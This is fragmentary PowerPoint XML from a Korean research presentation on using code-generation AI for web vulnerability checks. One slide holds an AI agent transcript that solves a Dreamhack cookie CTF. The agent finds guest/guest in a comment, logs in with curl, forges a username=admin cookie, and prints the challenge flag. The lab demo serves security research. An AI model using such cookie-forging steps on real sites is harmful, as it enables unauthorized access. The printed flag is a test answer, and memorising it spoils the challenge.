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0" r:id="rId13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9144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0">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="2879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slide" Target="slides/slide13.xml"></Relationship><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide14.xml"></Relationship><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide15.xml"></Relationship><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"></Relationship><Relationship Id="rId31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코드 생성 AI를 이용한 웹 취약점 점검 방법에 관한 연구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웹 애플리케이션 복잡도 증가 및 보안 위협 확산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기존 수동 점검: 인력·시간 소모, 취약점 누락 가능성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자동화 도구: 정형화된 패턴 탐지, 새로운 취약점 발견 어려움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AI 발전으로 자동화 보안 점검 가능성 확대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코드 생성 AI 활용 자동화 보안 점검 시스템 개발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자연어 → 실행 가능한 코드 변환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정적/동적 분석 결합으로 탐지 정확도 향상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실제 환경에서 효율성·정확성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관련연구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코드 생성 AI 특징: 자연어→코드 변환, 컨텍스트 이해, 다양한 언어 지원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웹 취약점 유형(OWASP Top 10): SQL Injection, XSS, CSRF, IDOR 등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000"/>
              <a:t>기존 점검 도구의 한계: 오탐·미탐, 인증 처리 한계, 로직 취약점 탐지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점검 방식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웹스캐너: 빠른 점검, 표준화된 취약점 탐지, 보고서 자동 생성 / 높은 오탐율, 로직 취약점 탐지 어려움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RPA 기반: 실제 사용자 시나리오 기반, 인증 자동화, 로직 취약점 탐지 강점 / 초기 구축 복잡, 유지보수 비용↑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제안 방법: 코드 생성 AI 기반 하이브리드 점검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웹스캐너 + RPA 장점 결합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딥러닝 기반 이상 탐지 및 자동 학습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비즈니스 로직 분석 강화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정기 점검 스케줄링 및 실시간 위협 탐지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코드 저장소 연동으로 유지보수 용이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코드 생성 전략 &amp; 품질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취약점 유형별 프롬프트 템플릿 설계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시나리오 기반 테스트 케이스 구성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코드 정확성·안전성 평가, 오탐/미탐 분석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반복·단순 업무에 AI 적용하여 효율성 향상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및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Cursor AI: SQL Injection 점검 코드 자동 생성, Selenium·Python 환경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Continue (VS Code): 로그인 포함 점검, 세션 정보 활용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다양한 페이로드 관리 및 자동화, 결과 캡처·문서화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 분석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코드 생성 AI: 오탐 낮음, 자동 기능 분석, 처리 속도 빠름, 유지보수 비용↓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웹스캐너/RPA: 오탐 높음, 기능 정의 필요, 속도 느림, 비용↑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향후 연구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800"/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점검 시간 40% 단축, 인력 비용 절감, 표준화된 절차로 신뢰성 향상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한계: 복잡한 로직 취약점 탐지 한계, 학습 데이터 의존성</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:defRPr sz="1400">
                <a:latin typeface="맑은 고딕"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr sz="2400"/>
              <a:t>향후: 머신러닝 기반 취약점 패턴 학습 강화, 최신 위협 대응 능력 고도화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2780-DF1E-D50E-51B5-9999BBFC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</p:spPr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4CCC1-3A06-C747-A73B-DF3459FC9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30235" cy="4526915"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" numCol="1" vert="horz" anchor="t">
            <a:normAutofit fontScale="40000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" latinLnBrk="0">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>&gt; http://host8.dreamhack.games:13968/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>에 접속해서 응답값 알려 줘 │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ko-KR" altLang="en-US"/>
              <a:t>╰─────────────────────────────────────────────────────────────────╯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ko-KR" altLang="en-US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ko-KR" altLang="en-US"/>
              <a:t> │ ✔  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>WebFetch Processing URLs and instructions from prompt: "http://host8.dreamhack.games:13968/"   │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│                                                                                                   │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│    Content for http://host8.dreamhack.games:13968/ processed using fallback fetch.                │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╰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╯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✦ I've accessed the page. It seems to be a web security challenge related to cookies. To solve this, I need to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  inspect the cookies set by the server.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 I will now use a command to get the detailed response headers from the server, which should include the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 cookie information.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  <a:endParaRPr lang="ko-KR" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" latinLnBrk="0">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t> │ ✔  Shell curl -v http://host8.dreamhack.games:13968/ (URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>에 접속하여 응답 헤더를 포함한 자세한 정보를 가져</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>…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96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2DC9-2F64-74D9-E3B9-1FC4DDA6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B681E-2525-9A1A-9508-856F32AA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2B28A-C8E2-6774-3610-AE5E413E8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/>
              <a:t>✦ 접속 결과</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>, HTTP/1.1 200 OK </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>응답을 받았으며</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>웹페이지의 내용은 정상적으로 표시됩니다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응답 헤더를 분석한 결과</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>서버에서 별도로 쿠키를 설정하는 부분은 확인되지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하지만 페이지 소스코드에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>&lt;!-- # default account: guest/guest --&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>라는 주석을 발견했습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>이를 통해</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>guest / guest </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>라는 계정 정보로 로그인을 시도해볼 수 있겠습니다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다음으로</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>로그인 페이지의 구조를 확인하여 어떻게 로그인 요청을 보내야 할지 파악하겠습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR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</a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t> │ ✔  Shell curl http://host8.dreamhack.games:13968/login (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>로그인 페이지의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>내용을 가져옵니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>.)  │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5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FC2A-DEC2-7C8B-2D74-CF9C4C67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185BD-082A-7EEC-E37F-51B1FDC6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DA1D2-706B-ECA7-7AC9-6104A7BA2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/>
              <a:t>✦ 로그인 페이지를 확인했습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>. username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>과 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>password </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>필드를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>방식으로 전송하여 로그인하는 것을</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>  확인했습니다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이제 알아낸 계정 정보</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>(guest/guest)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>를 사용하여 로그인을 시도하고</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>응답으로 쿠키가 설정되는지</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>  확인하겠습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR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</a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t> │ ✔  Shell curl -v -X POST -d "username=guest&amp;password=guest" http://host8.dreamhack.games:13968/login (guest…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78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424F-59DD-3B30-A945-85BBAABD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05A93-6ECF-FD1C-C3F0-A630B472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214E7A-E56A-C9A5-DA88-1254426A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/>
              <a:t>✦ 로그인에 성공했으며</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>서버가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>username=guest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>라는 쿠키를 설정하는 것을 확인했습니다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이제 이 쿠키 값을 조작하여 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>으로 접속을 시도해보겠습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>이를 통해 서버가 쿠키 값을 신뢰하는지</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>그리하여 권한 상승이 가능한지 확인할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</a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t> │ ✔  Shell curl -v --cookie "username=admin" http://host8.dreamhack.games:13968/ (username </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>쿠키를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>…  │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4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01A8D-9216-D12B-19F6-47FD854E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01C2D-4837-D2E2-CE0D-486A1A81F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/>
              <a:t>✦ 접속에 성공했으며</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>, username </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>쿠키를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US"/>
              <a:t>으로 변경하여 요청하자 서버가 응답으로 플래그를 반환했습니다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응답 값은 다음과 같습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>   1 &lt;h3&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>   2   Hello admin, flag is DH{7952074b69ee388ab45432737f9b0c56}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>   3 &lt;/h3&gt;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따라서 플래그는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR"/>
              <a:t>DH{7952074b69ee388ab45432737f9b0c56} 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11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12.000</AppVersion>
  <Characters>0</Characters>
  <CharactersWithSpaces>0</CharactersWithSpaces>
  <DocSecurity>0</DocSecurity>
  <HyperlinksChanged>false</HyperlinksChanged>
  <Lines>0</Lines>
  <LinksUpToDate>false</LinksUpToDate>
  <Pages>15</Pages>
  <Paragraphs>101</Paragraphs>
  <Words>833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po_user</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-15T08:19:27Z</dcterms:modified>
</cp:coreProperties>
</file>